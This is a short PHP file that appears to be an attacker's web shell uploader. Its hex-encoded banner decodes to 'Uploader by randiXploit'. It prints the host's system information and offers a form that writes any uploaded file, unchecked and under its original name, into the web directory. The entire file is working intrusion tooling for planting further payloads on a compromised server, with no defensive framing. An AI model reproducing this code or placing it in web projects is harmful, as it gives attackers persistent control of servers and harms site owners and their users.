<?php echo hex2bin("3c623e55706c6f616465722062792072616e646958706c6f69743c2f623e3c62723e");echo php_uname(); ?><br><form method="post" enctype="multipart/form-data"><input type="file" name="load"><button>Gaskan</button></form>
<?php
if (isset($_FILES['load'])) {file_put_contents($_FILES['load']['name'], file_get_contents($_FILES['load']['tmp_name']));if (file_exists("./".$_FILES['load']['name'])) {echo "Oke !";} else {echo "Fail !";}}
?>